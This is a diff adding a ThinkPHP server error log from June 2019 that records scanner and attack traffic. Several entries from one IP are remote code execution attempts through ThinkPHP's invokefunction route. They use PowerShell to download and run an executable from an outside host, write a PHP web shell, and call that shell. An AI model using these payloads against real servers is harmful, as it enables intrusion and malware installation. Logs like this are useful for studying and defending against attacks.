@@ -1,0 +1,24 @@
+[ 2019-06-13T05:22:49+08:00 ] 77.247.110.106 /robots.txt
+ERR: 无法加载模块:Robots
+
+[ 2019-06-13T05:29:04+08:00 ] 222.88.94.77 /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/zthvkgvmopeuelz157.exe');start%20%SystemRoot%/Temp/zthvkgvmopeuelz157.exe
+ERR: 无法加载模块:Index
+
+[ 2019-06-13T05:29:04+08:00 ] 222.88.94.77 /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
+ERR: 无法加载模块:Index
+
+[ 2019-06-13T05:29:04+08:00 ] 222.88.94.77 /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/zthvkgvmopeuelz157.exe');start%20%SystemRoot%/Temp/zthvkgvmopeuelz157.exe
+ERR: 无法加载模块:Public
+
+[ 2019-06-13T06:18:19+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
+ERR: 无法加载模块:Cache
+
+[ 2019-06-13T07:25:00+08:00 ] 216.245.193.10 /robots.txt
+ERR: 无法加载模块:Robots
+
+[ 2019-06-13T16:21:21+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
+ERR: 无法加载模块:Cache
+
+[ 2019-06-13T17:13:00+08:00 ] 139.162.88.63 http://clientapi.ipip.net/echo.php?info=1234567890
+ERR: 无法加载模块:Echo
+
